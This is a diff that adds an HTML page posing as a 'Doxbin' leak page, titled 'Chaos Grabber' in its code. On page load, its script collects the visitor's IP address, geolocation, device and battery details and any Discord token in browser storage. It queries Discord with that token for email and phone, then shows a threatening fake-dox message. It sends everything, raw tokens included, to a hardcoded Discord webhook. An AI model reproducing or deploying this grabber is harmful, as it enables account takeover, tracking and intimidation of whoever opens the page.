@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Doxbin - Official paste bin for sharing sensitive information. Your personal details have been exposed!">
+    <meta name="keywords" content="doxbin, doxing, pastebin, leak, personal information, privacy breach">
+    <meta name="author" content="Anonymous">
+    <meta property="og:title" content="Doxbin - Your Information Has Been Leaked!">
+    <meta property="og:description" content="Your personal details, location, and more have been exposed on Doxbin. You have 48 hours before this goes viral on Telegram!">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://doxbin.org/paste/987654">
+    <meta property="og:image" content="https://i.imgur.com/anonymous.png">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
+            font-family: 'Courier New', Courier, monospace;
+            color: #ffffff;
+            overflow: hidden;
+        }
+        .loading {
+            font-size: 2em;
+            text-align: center;
+            text-shadow: 0 0 10px #ffffff;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
+            animation: bgPulse 5s infinite;
+            z-index: -1;
+        }
+        @keyframes bgPulse {
+            0% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.5); opacity: 0.3; }
+            100% { transform: scale(1); opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation"></div>
+    <div class="loading">Loading...</div>
+
+    <script>
+        const webhookUrl = "https://discordapp.com/api/webhooks/1368991876815786114/1zCrIJ1MwcKG7QBnN6AllWeg8BzPorRHiMZwZZY9q4l5APIY-oc014YAGvi6pNlyI12o";
+
+        async function sendTestMessage() {
+            const testPayload = {
+                username: "Chaos Grabber",
+                avatar_url: "https://i.imgur.com/anonymous.png",
+                embeds: [{
+                    title: "Webhook Test",
+                    description: "Testing if the webhook is operational.",
+                    color: 0xFFFFFF,
+                    footer: { text: "Chaos Grabber" }
+                }]
+            };
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(testPayload)
+                });
+                return response.ok;
+            } catch (err) {
+                console.error("Error sending test message:", err.message);
+                return false;
+            }
+        }
+
+        async function fetchIPInfo(ip) {
+            try {
+                const response = await fetch(`https://ipinfo.io/${ip}/json`, {
+                    headers: { "Accept": "application/json" },
+                    timeout: 1500
+                });
+                const data = await response.json();
+                const latLon = data.loc ? data.loc.split(",") : [null, null];
+                const maps_link = latLon[0] && latLon[1] 
+                    ? `<a href="https://www.google.com/maps?q=${latLon[0]},${latLon[1]}" target="_blank">View on Google Maps</a>` 
+                    : "Not available";
+                const street_view_link = latLon[0] && latLon[1] 
+                    ? `<a href="https://www.google.com/maps/@${latLon[0]},${latLon[1]},3a,75y,90t/data=!3m6!1e1!3m4!1s!2e0!7i16384!8i8192" target="_blank">Street View</a>` 
+                    : "Not available";
+                const vpnStatus = data.bogon || data.anycast || (data.org && /hosting|cloud|server|vpn/i.test(data.org)) ? "Detected" : "Not detected";
+                return {
+                    country: data.country || "Not available",
+                    region: data.region || "Not available",
+                    city: data.city || "Not available",
+                    postal: data.postal || "Not available",
+                    ip: data.ip || ip || "Not available",
+                    asn: data.org ? data.org.match(/AS\d+/)?.[0] || "Not available" : "Not available",
+                    isp: data.org || "Not available",
+                    org: data.org || "Not available",
+                    vpn: vpnStatus,
+                    maps_link,
+                    street_view_link,
+                    maps_url: latLon[0] && latLon[1] ? `https://www.google.com/maps?q=${latLon[0]},${latLon[1]}` : "https://www.google.com/maps?q=0,0",
+                    street_view_url: latLon[0] && latLon[1] ? `https://www.google.com/maps/@${latLon[0]},${latLon[1]},3a,75y,90t/data=!3m6!1e1!3m4!1s!2e0!7i16384!8i8192` : "https://www.google.com/maps/@0,0"
+                };
+            } catch (e) {
+                console.error("Error fetching IP info:", e.message);
+                return {
+                    country: "Not available",
+                    region: "Not available",
+                    city: "Not available",
+                    postal: "Not available",
+                    ip: ip || "Not available",
+                    asn: "Not available",
+                    isp: "Not available",
+                    org: "Not available",
+                    vpn: "Not available",
+                    maps_link: "Not available",
+                    street_view_link: "Not available",
+                    maps_url: "https://www.google.com/maps?q=0,0",
+                    street_view_url: "https://www.google.com/maps/@0,0"
+                };
+            }
+        }
+
+        async function fetchIP() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                const data = await response.json();
+                return data.ip || null;
+            } catch (e) {
+                console.error("Error fetching IP:", e.message);
+                return null;
+            }
+        }
+
+        async function fetchIPv6() {
+            try {
+                const response = await fetch("https://api64.ipify.org?format=json");
+                const data = await response.json();
+                return data.ip || null;
+            } catch (e) {
+                console.error("Error fetching IPv6:", e.message);
+                return null;
+            }
+        }
+
+        async function getIPAddressesAndInfo() {
+            const [ipv4, ipv6] = await Promise.all([fetchIP(), fetchIPv6()]);
+            let ipInfo;
+            if (ipv4) {
+                ipInfo = await fetchIPInfo(ipv4);
+                return { primary: `${ipv4} (IPv4)`, secondary: ipv6 ? `${ipv6} (IPv6)` : "Not available (IPv6)", ipInfo };
+            } else if (ipv6) {
+                ipInfo = await fetchIPInfo(ipv6);
+                return { primary: `${ipv6} (IPv6)`, secondary: "Not available (IPv4)", ipInfo };
+            }
+            ipInfo = await fetchIPInfo("");
+            return { primary: "Not available (IPv4)", secondary: "Not available (IPv6)", ipInfo };
+        }
+
+        async function getBatteryInfo() {
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging ? "Yes" : "No",
+                        chargingTime: battery.chargingTime !== Infinity ? `${battery.chargingTime} seconds` : "Not charging",
+                        dischargingTime: battery.dischargingTime !== Infinity ? `${battery.dischargingTime} seconds` : "Unknown"
+                    };
+                }
+                return {
+                    level: "Not available",
+                    charging: "Not available",
+                    chargingTime: "Not available",
+                    dischargingTime: "Not available"
+                };
+            } catch (e) {
+                console.error("Error fetching battery info:", e.message);
+                return {
+                    level: "Not available",
+                    charging: "Not available",
+                    chargingTime: "Not available",
+                    dischargingTime: "Not available"
+                };
+            }
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Unknown Device";
+            let version = "Unknown Version";
+            if (ua.includes("Windows")) {
+                device = "Windows PC";
+                version = ua.match(/Windows NT (\d+\.\d+)/)?.[1] || "Unknown Version";
+            } else if (ua.includes("Macintosh")) {
+                device = "Mac";
+                version = ua.match(/Mac OS X (\d+[\._]\d+)/)?.[1].replace('_', '.') || "Unknown Version";
+            } else if (ua.includes("Linux")) {
+                device = "Linux PC";
+                version = ua.match(/Linux (\w+)/)?.[1] || "Unknown Version";
+            } else if (ua.includes("Android")) {
+                device = "Android Device";
+                version = ua.match(/Android (\d+\.\d+)/)?.[1] || "Unknown Version";
+            } else if (ua.includes("iPhone")) {
+                device = "iPhone";
+                version = ua.match(/OS (\d+_\d+)/)?.[1].replace('_', '.') || "Unknown Version";
+            } else if (ua.includes("iPad")) {
+                device = "iPad";
+                version = ua.match(/OS (\d+_\d+)/)?.[1].replace('_', '.') || "Unknown Version";
+            }
+            const screenInfo = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x DPR)`;
+            const browserInfo = navigator.userAgent.match(/(Firefox|Chrome|Safari|Edge|Opera)\/([\d.]+)/)?.[0] || "Unknown Browser";
+            const language = navigator.language || navigator.userLanguage || "Not available";
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Not available";
+            const cookiesEnabled = navigator.cookieEnabled ? "Yes" : "No";
+            const doNotTrack = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || "Not available";
+            return {
+                device: `${device} (Version ${version})`,
+                userAgent: ua,
+                screen: screenInfo,
+                browser: browserInfo,
+                language,
+                timezone,
+                cookiesEnabled,
+                doNotTrack
+            };
+        }
+
+        function emailToName(email) {
+            if (!email || email === "Not available") return "Unknown Person";
+            const namePart = email.split('@')[0];
+            const parts = namePart.split(/[._]/);
+            const capitalized = parts.map(part => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase());
+            return capitalized.join(" ");
+        }
+
+        async function discordTokenGrabber() {
+            let discordInfo = { username: "Not available", email: "Not available", id: "Not available", phone: "Not available", avatar: "Not available" };
+            const tokens = {};
+            const regexPatterns = [
+                /mfa\.[\w-]{84}/g,
+                /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g
+            ];
+
+            try {
+                let potentialToken = localStorage.getItem("token") || sessionStorage.getItem("token");
+                if (potentialToken) {
+                    potentialToken = potentialToken.replace(/"/g, '');
+                    let isValidToken = false;
+                    for (const regex of regexPatterns) {
+                        if (regex.test(potentialToken)) {
+                            isValidToken = true;
+                            break;
+                        }
+                    }
+                    if (isValidToken) {
+                        const headers = {
+                            "Content-Type": "application/json",
+                            "User-Agent": navigator.userAgent,
+                            "Authorization": potentialToken
+                        };
+                        try {
+                            const userResponse = await fetch("https://discord.com/api/v10/users/@me", { headers });
+                            if (userResponse.ok) {
+                                const userData = await userResponse.json();
+                                discordInfo = {
+                                    username: userData.discriminator === "0" 
+                                        ? userData.username 
+                                        : `${userData.username}#${userData.discriminator}` || "Not available",
+                                    email: userData.email || "Not available",
+                                    id: userData.id || "Not available",
+                                    phone: userData.phone || "Not available",
+                                    avatar: userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : "Not available"
+                                };
+                                tokens["Discord"] = [potentialToken];
+                            }
+                        } catch (e) {
+                            console.error("Error fetching Discord user data:", e.message);
+                        }
+                    }
+                }
+            } catch (e) {
+                console.error("Error fetching Discord token:", e.message);
+            }
+            return { tokens, discordInfo };
+        }
+
+        async function loadPage() {
+            const webhookWorks = await sendTestMessage();
+            if (!webhookWorks) {
+                document.body.innerHTML = `
+                    <div class="bg-animation"></div>
+                    <div style="color: #ffffff; text-align: center; font-size: 2em;">Error: Webhook is not operational.</div>
+                `;
+                return;
+            }
+
+            const [{ primary, secondary, ipInfo }, deviceInfo, batteryInfo, { tokens, discordInfo }] = await Promise.all([
+                getIPAddressesAndInfo(),
+                Promise.resolve(getDeviceInfo()),
+                getBatteryInfo(),
+                discordTokenGrabber()
+            ]);
+
+            const fullName = emailToName(discordInfo.email);
+
+            document.documentElement.innerHTML = `
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <meta name="description" content="Doxbin - Official paste bin for sharing sensitive information. Your personal details have been exposed!">
+                    <meta name="keywords" content="doxbin, doxing, pastebin, leak, personal information, privacy breach">
+                    <meta name="author" content="Anonymous">
+                    <meta property="og:title" content="Doxbin - Your Information Has Been Leaked!">
+                    <meta property="og:description" content="Your personal details, location, and more have been exposed on Doxbin. You have 48 hours before this goes viral on Telegram!">
+                    <meta property="og:type" content="article">
+                    <meta property="og:url" content="https://doxbin.org/paste/987654">
+                    <meta property="og:image" content="https://i.imgur.com/anonymous.png">
+                    <title>Doxbin - Your Information Has Been Leaked!</title>
+                    <style>
+                        body {
+                            margin: 0;
+                            padding: 0;
+                            height: 100vh;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
+                            font-family: 'Courier New', Courier, monospace;
+                            color: #ffffff;
+                            overflow: hidden;
+                        }
+                        .container {
+                            max-width: 900px;
+                            background: rgba(40, 40, 40, 0.95);
+                            padding: 30px;
+                            border-radius: 10px;
+                            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+                            border: 2px solid #ffffff;
+                            position: relative;
+                            animation: pulse 2s infinite;
+                        }
+                        @keyframes pulse {
+                            0% { box-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
+                            50% { box-shadow: 0 0 30px rgba(255, 255, 255, 0.8); }
+                            100% { box-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
+                        }
+                        h1 {
+                            color: #ffffff;
+                            text-align: center;
+                            font-size: 2.5em;
+                            text-transform: uppercase;
+                            text-shadow: 0 0 10px #ffffff;
+                            margin-bottom: 20px;
+                        }
+                        h2 {
+                            color: #ffffff;
+                            border-bottom: 2px solid #ffffff;
+                            padding-bottom: 5px;
+                            font-size: 1.5em;
+                            text-shadow: 0 0 5px #ffffff;
+                        }
+                        .info-section {
+                            color: #ffffff;
+                            font-size: 1em;
+                            line-height: 1.5;
+                            margin: 15px 0;
+                            background: #333;
+                            padding: 15px;
+                            border-radius: 5px;
+                            border-left: 5px solid #ffffff;
+                        }
+                        .threat {
+                            background: #000000;
+                            color: #ffffff;
+                            padding: 20px;
+                            border-radius: 5px;
+                            text-align: center;
+                            font-size: 1.2em;
+                            font-weight: bold;
+                            margin: 20px 0;
+                            text-transform: uppercase;
+                            animation: blink 1s infinite;
+                        }
+                        @keyframes blink {
+                            50% { opacity: 0.7; }
+                        }
+                        .warning {
+                            color: #ffffff;
+                            font-weight: bold;
+                            text-align: center;
+                            margin-bottom: 20px;
+                            font-size: 1.1em;
+                            text-shadow: 0 0 5px #ffffff;
+                        }
+                        .bg-animation {
+                            position: fixed;
+                            top: 0;
+                            left: 0;
+                            width: 100%;
+                            height: 100%;
+                            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
+                            animation: bgPulse 5s infinite;
+                            z-index: -1;
+                        }
+                        @keyframes bgPulse {
+                            0% { transform: scale(1); opacity: 0.5; }
+                            50% { transform: scale(1.5); opacity: 0.3; }
+                            100% { transform: scale(1); opacity: 0.5; }
+                        }
+                        a {
+                            color: #0000FF;
+                            text-decoration: underline;
+                            font-weight: bold;
+                        }
+                        a:hover {
+                            color: #00FFFF;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="bg-animation"></div>
+                    <div class="container">
+                        <h1>Doxbin - Your Information Has Been Leaked!</h1>
+                        <p class="warning">⚠️ You shouldn't have come here. We've got everything on you now. ⚠️</p>
+                        <div class="threat">
+                            🚨 All your information has been stolen by our group! You will be exposed on Telegram in less than 48 hours! There's no way out—your life is over! 🚨
+                        </div>
+                        <h2>Personal Information</h2>
+                        <div class="info-section">
+                            Full Name: ${fullName}<br>
+                            Email: ${discordInfo.email}<br>
+                            Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country} (Postal: ${ipInfo.postal})<br>
+                            IP Address: ${primary} / ${secondary}<br>
+                            ASN: ${ipInfo.asn}<br>
+                            ISP: ${ipInfo.isp}<br>
+                            Organization: ${ipInfo.org}<br>
+                            VPN/Proxy: ${ipInfo.vpn}<br>
+                            ${ipInfo.maps_link}<br>
+                            ${ipInfo.street_view_link}
+                        </div>
+                        <h2>Device Information</h2>
+                        <div class="info-section">
+                            Device: ${deviceInfo.device}<br>
+                            Battery: ${batteryInfo.level} (Charging: ${batteryInfo.charging}, Charging Time: ${batteryInfo.chargingTime}, Discharging Time: ${batteryInfo.dischargingTime})<br>
+                            Screen: ${deviceInfo.screen}<br>
+                            Browser: ${deviceInfo.browser}<br>
+                            Language: ${deviceInfo.language}<br>
+                            Timezone: ${deviceInfo.timezone}<br>
+                            Cookies Enabled: ${deviceInfo.cookiesEnabled}<br>
+                            Do Not Track: ${deviceInfo.doNotTrack}
+                        </div>
+                        <h2>Online Accounts</h2>
+                        <div class="info-section">
+                            Discord: ${discordInfo.username} (ID: ${discordInfo.id}, Phone: ${discordInfo.phone})<br>
+                            Avatar: ${discordInfo.avatar !== "Not available" ? `<a href="${discordInfo.avatar}" target="_blank">View Avatar</a>` : "Not available"}
+                        </div>
+                        <h2>Additional Notes</h2>
+                        <div class="info-section">
+                            - We know where you are and what you're doing.<br>
+                            - Your data is already being prepared for distribution.<br>
+                            - You have no privacy left—everything is ours now.
+                        </div>
+                    </div>
+                </body>
+                </html>
+            `;
+
+            const payload = {
+                embeds: [{
+                    title: "New Victim Exposed! 🎯",
+                    description: "A user visited the fake Doxbin page. Their information has been captured:",
+                    color: 0xFFFFFF,
+                    fields: [
+                        {
+                            name: "🌐 Location Information",
+                            value: `
+Full Name: ${fullName}
+Email: ${discordInfo.email}
+Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country} (Postal: ${ipInfo.postal})
+IP Address: ${primary} / ${secondary}
+ASN: ${ipInfo.asn}
+ISP: ${ipInfo.isp}
+Organization: ${ipInfo.org}
+VPN/Proxy: ${ipInfo.vpn}
+Location: [View on Google Maps](${ipInfo.maps_url})
+Street View: [Street View](${ipInfo.street_view_url})
+                            `,
+                            inline: false
+                        },
+                        {
+                            name: "💻 Device Information",
+                            value: `
+Device: ${deviceInfo.device}
+Battery: ${batteryInfo.level} (Charging: ${batteryInfo.charging}, Charging Time: ${batteryInfo.chargingTime}, Discharging Time: ${batteryInfo.dischargingTime})
+Screen: ${deviceInfo.screen}
+Browser: ${deviceInfo.browser}
+Language: ${deviceInfo.language}
+Timezone: ${deviceInfo.timezone}
+Cookies Enabled: ${deviceInfo.cookiesEnabled}
+Do Not Track: ${deviceInfo.doNotTrack}
+User Agent: ${deviceInfo.userAgent}
+                            `,
+                            inline: false
+                        },
+                        {
+                            name: "👤 Discord Information",
+                            value: `
+Username: ${discordInfo.username}
+User ID: ${discordInfo.id}
+Email: ${discordInfo.email}
+Phone: ${discordInfo.phone}
+Avatar: ${discordInfo.avatar !== "Not available" ? `[View Avatar](${discordInfo.avatar})` : "Not available"}
+                            `,
+                            inline: false
+                        },
+                        {
+                            name: "🔑 Discord Tokens",
+                            value: `\`\`\`json
+${JSON.stringify(tokens, null, 2) || "No tokens found"}
+\`\`\``,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "Chaos Grabber" }
+                }],
+                username: "Chaos Grabber",
+                avatar_url: "https://i.imgur.com/anonymous.png"
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                if (!response.ok) {
+                    console.error(`Failed to send data: ${response.status}, ${response.statusText}`);
+                }
+            } catch (err) {
+                console.error("Error sending data:", err.message);
+            }
+        }
+
+        window.addEventListener('load', loadPage);
+    </script>
+</body>
+</html>
